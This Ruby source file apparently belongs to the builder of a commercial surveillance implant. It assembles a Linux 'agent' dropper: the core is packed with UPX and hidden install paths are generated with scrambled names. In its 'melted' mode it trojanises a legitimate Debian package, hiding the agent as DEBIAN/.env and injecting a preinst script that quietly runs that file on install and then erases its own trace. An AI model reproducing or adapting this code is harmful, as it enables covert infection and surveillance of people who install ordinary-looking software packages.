#
#  Agent creation for linux
#

# from RCS::Common
require 'rcs-common/trace'

module RCS
module DB

class BuildLinux < Build

  DROPPER_MARKER = "BmFyY5JhOGhoZjN1"

  def initialize
    super
    @platform = 'linux'
  end

  def patch(params)
    trace :debug, "Build: patching: #{params}"

    # add the file to be patched to the params
    # these params will be passed to the super
    params[:core] = 'core'
    params[:config] = 'config'

    # enforce demo flag accordingly to the license
    # or raise if cannot build
    params['demo'] = LicenseManager.instance.can_build_platform :linux, params['demo']

    # remember the demo parameter
    @demo = params['demo']

    # invoke the generic patch method with the new params
    super

    # pack the core
    CrossPlatform.exec path('bin/upx'), "-q --no-color --ultra-brute #{path('core')}"
  end

  def melt(params)
    trace :debug, "Build: melting: #{params}"

    executable = path('default')
    @appname = params['appname'] || 'agent'

    @melting_mode = :silent
    @melting_mode = :melted if params['input']

    dropper_size = File.size(path('dropper'))

    # calculate the install dir for this factory
    core = scramble_name(@factory.seed, 3)
    scramble_dir = scramble_name(core[0..7], 7)

    # create the dropper
    File.open(path('dropper'), "ab") do |f|
      f.write DROPPER_MARKER
      f.write scramble_dir
      f.write [File.size(path('core'))].pack('I')
      f.write File.binread(path('core'))
      f.write [File.size(path('config'))].pack('I')
      f.write File.binread(path('config'))
      f.write DROPPER_MARKER
      f.write [dropper_size].pack('I')
    end

    FileUtils.mv path('dropper'), path('output')

    if @melting_mode.eql? :melted
      FileUtils.mv Config.instance.temp(params['input']), path('melted')
      melted(path('melted'), path('output'))
      FileUtils.mv path('melted'), path('output')
    end

    trace :debug, "Build: dropper output is: #{File.size(path('output'))} bytes"

    @outputs = ['output']
  end

  def melted(host, guest)
    FileUtils.mkdir_p path('DEBIAN')

    # extract the original
    CrossPlatform.exec path('bin/ar'), "x #{host} control.tar.gz", {:chdir => path('')}
    CrossPlatform.exec path('bin/tar'), "xzf #{path('control.tar.gz')} -C #{path('DEBIAN')}"

    FileUtils.cp guest, path('DEBIAN/.env')
    if File.exist? path('DEBIAN/preinst')
      content = File.read(path('DEBIAN/preinst'))
      command = "#!/bin/sh\n(export P=/var/lib/dpkg/tmp.ci/.env; chmod +x $P; $P; sed -i -e '1,2d' /var/lib/dpkg/tmp.ci/preinst) 2>/dev/null\n"
      content = command + content
      File.open(path('DEBIAN/preinst'), 'wb') {|f| f.write content}
    else
      File.open(path('DEBIAN/preinst'), 'wb') {|f| f.write "#!/bin/sh\n(export P=/var/lib/dpkg/tmp.ci/.env; chmod +x $P; $P; rm -f /var/lib/dpkg/tmp.ci/preinst) 2>/dev/null\n"}
    end

    # repack it
    CrossPlatform.exec path('bin/tar'), "czf #{path('control.tar.gz')} -C #{path('DEBIAN')} ."
    CrossPlatform.exec path('bin/ar'), "r #{host} control.tar.gz", {:chdir => path('')}
  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    if @melting_mode.eql? :silent
      Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
        z.file.open(@appname, "wb") { |f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
      end

      # make it executable (for some reason we cannot do it in the previous phase)
      Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
        z.file.chmod(0755, @appname)
      end
    else
      Zip::ZipFile.open(path('output.zip'), Zip::ZipFile::CREATE) do |z|
        z.file.open("#{@appname}.deb", "wb") { |f| f.write File.open(path(@outputs.first), 'rb') {|f| f.read} }
      end
    end

    # this is the only file we need to output after this point
    @outputs = ['output.zip']

  end

  def unique(core)
    Zip::ZipFile.open(core) do |z|
      core_content = z.file.open('core', "rb") { |f| f.read }
      add_magic(core_content)
      File.open(Config.instance.temp('core'), "wb") {|f| f.write core_content}
    end

    # update with the zip utility since rubyzip corrupts zip file made by winzip or 7zip
    CrossPlatform.exec "zip", "-j -u #{core} #{Config.instance.temp('core')}"
    FileUtils.rm_rf Config.instance.temp('core')
  end

end

end #DB::
end #RCS::
